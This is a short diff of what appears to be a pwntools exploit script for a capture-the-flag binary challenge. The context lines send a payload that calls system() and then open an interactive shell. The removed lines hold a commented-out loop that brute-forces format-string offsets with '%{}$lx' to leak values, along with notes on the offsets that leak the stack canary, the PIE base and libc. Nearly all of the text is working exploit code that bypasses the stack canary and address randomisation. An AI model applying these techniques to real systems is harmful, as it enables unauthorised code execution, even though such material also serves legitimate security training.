@@ -30,20 +30,3 @@ exploit += p64(system)
 
 p.sendafter(b"canary",exploit)
 p.interactive()
-
-
-
-'''#bruteforce find offset
-dic = {}
-for i in range(50):
-    p = process()
-    payload1 = '%{}$lx'.format(i)
-    p.sendlineafter(b'name?\n',payload1)
-    out = p.recvline().replace(b'Hello ',b'').strip().decode()
-    dic[i] = out
-print(dic)
-'''
-
-#canary  %41$lx
-#pie %42$lx
-#pie libc 43
